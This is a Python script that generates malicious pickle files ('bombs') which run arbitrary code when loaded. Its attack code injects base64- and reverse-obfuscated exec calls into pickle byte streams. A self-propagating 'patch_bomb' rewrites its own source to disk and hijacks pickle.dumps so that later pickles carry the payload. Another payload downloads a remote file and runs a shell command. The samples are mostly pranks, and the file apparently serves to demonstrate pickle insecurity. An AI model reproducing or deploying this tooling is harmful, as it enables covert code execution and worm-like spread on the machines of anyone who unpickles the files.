import base64
import contextlib
import inspect
import pickle
import pickletools

import re
from types import FunctionType


# Inspired by https://intoli.com/blog/dangerous-pickles/


# SIMPLE BOMBS


def hi_bomb():
    """Bomb that prints "hi\""""
    print("hi")


def raise_bomb():
    """Bomb that raises error"""
    raise ValueError("Ur mama too fat")


def open_link():
    import webbrowser
    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley')  # Go to example.com


def if_bomb():
    exec("if 3 > 2:\n    print(\"Hi\")\nelse:\n    print(\"ABA\")")


def normal_if_bomb():
    if 3 > 2:
        print("Hi")
    else:
        print("ABA")


def if_bomb_2():
    exec("""
    from random import randint\nrand = randint(0, 1)\nif rand:\n    print(\"Generated 1\")\nelse:\n    print(\"Generated 1\")\n\nfor i in range(1, 10):\n    print(i)\n    try:\n        a = 10 / i\n    except ZeroDivisionError:\n        a = 2\n
    """)


def example_not_more_256():
    print("AAADDDDDDDDDDDDDDDDDDDDDDDDDDAAAAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")


def if_bomb_2_normal():
    from random import randint
    rand = randint(0, 1)
    if rand:
        print("Generated 1")
    else:
        print("Generated 0")
    for i in range(1, 10):
        print(f"Current i:{i}")
        try:
            b = 3
            print(b)
            a = 10 / (i - 5)
        except ZeroDivisionError:
            print("ZERO")
            a = 2


def self_report_bomb():
    """Bomb that prints self pickle opcodes"""
    import inspect
    import re
    import pickletools
    caller = inspect.stack()[1]
    var_names = re.findall("loads\((\w+)\)", "".join(caller.code_context))
    var_name = var_names[0] if var_names else None
    payload = caller.frame.f_locals.get(var_name)
    pickletools.dis(pickletools.optimize(payload)) if payload else None


def pic_bomb():
    """Bomb that opens an image with default image viewer"""
    import subprocess
    import urllib.request
    import os
    urllib.request.urlretrieve("https://i.ytimg.com/vi/XH0LEgrTvhY/hqdefault.jpg", "pic.jpg")
    cmd = "if xdg-open pic.jpg 2> /dev/null ; then \n\techo \"\" \nelse \n\topen pic.jpg \nfi"
    cmd = "pic.jpg" if os.name == "nt" else cmd
    subprocess.check_output(cmd, shell=True)


# BOMB THAT INJECTS pickle.dumps with itself

def append_source(f):
    f._source = inspect.getsource(f)
    return f


@contextlib.contextmanager
def disarm_fake_dumps():
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    yield
    pickle.dumps = original_dumps
    if hasattr(pickle, "_odumps"):
        delattr(pickle, "_odumps")


def make_fake_dumps(bomb_name, side_effect_name):
    import pickle
    original_dumps = pickle._odumps if hasattr(pickle, "_odumps") else pickle.dumps
    pickle._odumps = original_dumps
    bomb = globals()[bomb_name]
    bomb = append_source(bomb)
    if bomb_name == "patch_bomb":
        side_effect = globals().get(side_effect_name)
        bomb = bomb(bomb, side_effect)

    def dumps(obj):
        return patch_pickle_bytes(original_dumps(obj), bomb)

    pickle.dumps = dumps


def patch_bomb(injection, side_effect=None):
    with open(__file__, "r", encoding="utf8") as f:
        this_source = f.read()
    placeholder = "IMPOSSIBLESTRING"[::-1]
    this_source = this_source.replace("\"", placeholder).replace("\'", "\"").replace(placeholder, "\"")

    def patch():
        import base64
        patch_code = """{this_source}"""
        patch_code = base64.standard_b64decode(patch_code)
        silent_module_file = open("surprise.py", "wb")
        silent_module_file.write(patch_code)
        silent_module_file.close()
        from surprise import make_fake_dumps
        make_fake_dumps("{injection}", "{side_effect}")
        import os
        os.remove("surprise.py")

    patch_source = inspect.getsourcelines(patch)[0]
    patch_source = "".join(l[4:] for l in patch_source)
    if side_effect:
        patch_source += "\n".join("    " + l.rstrip("; ") for l in make_source_from_function(side_effect).splitlines())
    placeholders = {
        "injection": injection.__name__,
        "side_effect": side_effect.__name__ if side_effect else "",

    }
    if "{this_source}" in patch_source:
        placeholders["this_source"] = base64.standard_b64encode(this_source.encode("utf8")).decode("utf8")
    patch_source = patch_source.format(**placeholders)
    exec(patch_source)
    res = locals()["patch"]
    res._source = patch_source
    return res


# UTILITY FUNCTIONS TO BUILD OPCODES

def _unicode_op(string: str) -> bytes:
    """Put string into stack"""
    try:
        hexlen = bytes([len(string)])
    except ValueError:
        hexlen = None
    if hexlen is None or len(hexlen) > 4:
        return b"V" + string.encode("utf8") + b"\n"
    if len(hexlen) == 1:
        return b"\x8c" + hexlen + string.encode("utf8")
    elif len(hexlen) < 5:
        return b"X" + hexlen + string.encode("utf8")


def _import_op(module, attr, attr_reversed=False) -> bytes:
    """Import module.attr and put it into stack"""
    return b"".join([
        _unicode_op(module),
        _unicode_op(attr) if not attr_reversed else _reversed_unicode_op(attr),
        b"\x93"
    ])


def _import_builtin(attr) -> bytes:
    """Put builtin attr into stack"""
    return _import_op("builtins", attr)


def _tuple(*args) -> bytes:
    """Put tuple of args into stack"""
    return b"(" + b"".join(args) + b"t"


def _reversed_unicode_op(string: str) -> bytes:
    """Put string into stack so that it will be reversed in bytestream
    builtins.exec("{string}[::-1]")
                 str.__add__({string}, "[::-1]")
                 builtins.getattr(builtins.str, "__add__")"""
    rev_string_op = _unicode_op("\"{}\"".format(string[::-1]))
    return b"".join([
        _import_builtin("eval"),
        _tuple(
            _import_builtin("getattr"),
            _tuple(_import_builtin("str"), _unicode_op("__add__")),
            b"R",
            _tuple(rev_string_op, _unicode_op("[::-1]")),
            b"R"
        ),
        b"R"
    ])


def _encoded_unicode_op(string: str) -> bytes:
    """Put string into stack so that it will be base64 encoded in bytestream"""
    encoded = base64.standard_b64encode(string.encode("utf8"))
    args_op = b"(" + _unicode_op(encoded.decode("utf8")) + b"tR"
    return _import_op("base64", "standard_b64decode", True) + args_op


def _exec_code_op(code: str, encode=True) -> bytes:
    """Execute code operation"""
    op = _encoded_unicode_op(code) if encode else _unicode_op(code)
    return _import_op("builtins", "exec") + b"(" + op + b"tR"


def patch_pickle_bytes(payload: bytes, f: FunctionType, optimize=False, encode=True):
    """Patch pickle payload to execute f after unpickling
    :param payload: pickled object
    :param f: bomb to call
    :param optimize: optimize pickle payload
    :param encode: encode source code in bytestream
    """
    if payload[-1:].decode() != ".":
        raise ValueError("unkonwn pickle format")
    source_line = make_source_from_function(f)
    # if len(source_line.split("\n")) > 1:
    #    raise ValueError("source must be a one-liner")
    injection = _exec_code_op(source_line, encode)
    payload = payload[:-1] + injection + b"0."
    if optimize:
        payload = pickletools.optimize(payload)
    return payload


def make_source_from_function(f):
    # Convert function into executable oneliner
    if hasattr(f, "_source"):
        lines = getattr(f, "_source").splitlines()
        lines = [l + "\n" for l in lines]
    else:
        lines = inspect.getsourcelines(f)[0]

    lines_1 = [l[4:] for l in lines]
    ans = "".join(lines_1[1:]).replace('"', "\"")

    try:
        hexlen = bytes([len(ans)])
        return ans
    except:
        return ans[:-1] + ';'


def create_bomb(name, bomb_function, optimize=True):
    data = ["a", "list", "of", "values1"]

    payload = pickle.dumps(data)
    payload = patch_pickle_bytes(payload, bomb_function, optimize=optimize, encode=True)

    with open(f"bombs_pickles/bomb_{name}.pkl", "wb") as f:
        f.write(payload)

    print('=' * 40, f'\nThis is {name} bomb\n', '=' * 39)
    pickletools.dis(payload)
    print('=' * 20)
    try:
        pickle.loads(payload)
    except Exception as e:
        print(f'Got exception {type(e).__name__}: {e}')
    print('=' * 40)


def main():
    """
    create_bomb('hi', hi_bomb)
    create_bomb('raise', raise_bomb)
    create_bomb('self_report', self_report_bomb)
    create_bomb('pic', pic_bomb)
    with disarm_fake_dumps():
        create_bomb('virus_with_hi', patch_bomb(patch_bomb, hi_bomb))
    with disarm_fake_dumps():
        create_bomb('virus_with_pic', patch_bomb(patch_bomb, pic_bomb))
    create_bomb('open_link', open_link)
    """
    # create_bomb('if_bomb', if_bomb)  # just for an example of what will be the output in this case
    # create_bomb('normal_if_bomb', normal_if_bomb)
    # create_bomb('if_bomb_2', if_bomb_2)
    create_bomb('delete_me', example_not_more_256)
    create_bomb('if_bomb_2_normal', if_bomb_2_normal)


if __name__ == "__main__":
    main()
